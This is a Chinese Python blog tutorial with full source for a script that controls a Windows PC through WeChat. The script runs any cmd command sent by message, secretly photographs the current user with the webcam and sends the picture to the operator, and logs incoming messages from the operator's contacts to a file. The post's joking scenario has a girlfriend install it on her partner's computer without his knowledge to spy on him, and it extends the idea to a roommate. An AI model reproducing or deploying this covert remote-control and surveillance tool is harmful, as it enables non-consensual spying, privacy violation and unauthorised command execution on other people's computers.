---
title: Python骚操作：微信远程控制电脑
copyright: true
top: 95
date: 2018-08-20 12:18:36
categories: [Python]
tags: [Python]
image: https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1535737402924&di=62a7cf778582349d52fa8a581d50fe96&imgtype=0&src=http%3A%2F%2Fpic1.win4000.com%2Fwallpaper%2F2%2F5950693652acd.jpg
---


今天带给大家一个非常有意思的 python 程序，基于 itchat 实现微信控制电脑。你可以通过在微信发送命令，来拍摄当前电脑的使用者，然后图片会发送到你的微信上。甚至你可以发送命令来远程关闭电脑。

  
<!--more-->

![](https://yfzhou.oss-cn-beijing.aliyuncs.com/blog/img/374660489816441329_%E7%9C%8B%E5%9B%BE%E7%8E%8B.jpg?x-oss-process=style/w200)

**应用场景**

  

你可爱又迷人的女朋友，在看到这篇教程之后，非常的开心。在你的电脑上部署了这个脚本，并且在你不知情的情况下，默默的登录上。随后跟你说我出去跟闺蜜逛街啦，今天就不陪你了。要记得不准吃鸡。

  

你心想老子终于可以放松一天了！开心的吃鸡！口上说着：“好的！亲爱的玩得开心！”等着女朋友出门以后，你就开启了吃鸡模式，在绝地求生里大开杀戒。

  

你的女朋友早已对你了如指掌，通过脚本，先让电脑截图留下现场证据，随后再打电话质问你是否在吃鸡，你如果撒谎就把电脑远程关机。

  

最后你想了下不对我没有女朋友啊，随后你转头微笑地看着你的室友。

  

**程序思路**

此次程序使用的环境是 python3.7 + windows7，在运行程序之前请先确保你已经安装好了 opencv-python 和 matplotlib。通过 pip install 即可安装。

```
pip install opencv-python
pip install matplotlib
```

程序主要是通过使用 itchat 库来登录到微信网页端，然后通过 itchat 来发送消息和接收消息。并通过 opencv 来调用电脑的摄像头，把当前使用电脑的用户拍照下来，发送到你的微信上。至于远程关机是通过调用 os 库，发送 cmd 命名即可实现。

  

**程序源码**

  
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2018/8/20 11:12
# @Author  : yfzhou
# @Site    : 
# @File    : wechat_control_computer.py
# @Software: PyCharm
# Life is short, I use python.

import itchat
import os
import time
import cv2

sendMsg = u"{消息助手}：暂时无法回复"
usageMsg = u"使用方法：\n1.运行CMD命令：cmd xxx (xxx为命令)\n" \
           u"-例如关机命令:\ncmd shutdown -s -t 0 \n" \
           u"2.获取当前电脑用户：cap\n3.启用消息助手(默认关闭)：ast\n" \
           u"4.关闭消息助手：astc"
flag = 0  # 消息助手开关
nowTime = time.localtime()
filename = str(nowTime.tm_mday) + str(nowTime.tm_hour) + str(nowTime.tm_min) + str(nowTime.tm_sec) + ".txt"
myfile = open(filename, 'w')


@itchat.msg_register('Text')
def text_reply(msg):
    global flag
    message = msg['Text']
    fromName = msg['FromUserName']
    toName = msg['ToUserName']

    if toName == "filehelper":
        if message == "cap":
            cap = cv2.VideoCapture(0)
            ret, img = cap.read()
            cv2.imwrite("weixinTemp.jpg", img)
            itchat.send('@img@%s' % u'weixinTemp.jpg', 'filehelper')
            cap.release()
        if message[0:3] == "cmd":
            os.system(message.strip(message[0:4]))
        if message == "ast":
            flag = 1
            itchat.send("消息助手已开启", "filehelper")
        if message == "astc":
            flag = 0
            itchat.send("消息助手已关闭", "filehelper")
    elif flag == 1:
        itchat.send(sendMsg, fromName)
        myfile.write(message)
        myfile.write("\n")
        myfile.flush()


if __name__ == '__main__':
    itchat.auto_login()
    itchat.send(usageMsg, "filehelper")
    itchat.run()

```
  
程序并不复杂，定义了一些发送的消息，然后通过调用 itchat 和 cv2 相关库的操作，即可实现。关于 itchat 库的一些操作，可以去网上找相关的文档。

  

****使用教程****

获取源代码，然后在你的电脑上运行。随后会弹出一个微信网页登录的二维码。

  
![](https://yfzhou.oss-cn-beijing.aliyuncs.com/blog/img/TIM%E6%88%AA%E5%9B%BE20180820122055.png?x-oss-process=style/w200)

  

使用你的手机微信扫描登录，等待一会儿，微信文件助手就会收到相应操作信息。

  

![](https://yfzhou.oss-cn-beijing.aliyuncs.com/blog/img/374660489816441329_%E7%9C%8B%E5%9B%BE%E7%8E%8B.jpg?x-oss-process=style/w200)

  

发送消息「cmd shutdown -s -t 0」即可让当前的电脑关闭。

  

发送消息「cap」即可调用电脑摄像头拍摄当前用户，然后把图片发送到微信上。


当然 cmd 命名还可以做更多有趣的事，大家可以自己去网上搜索下。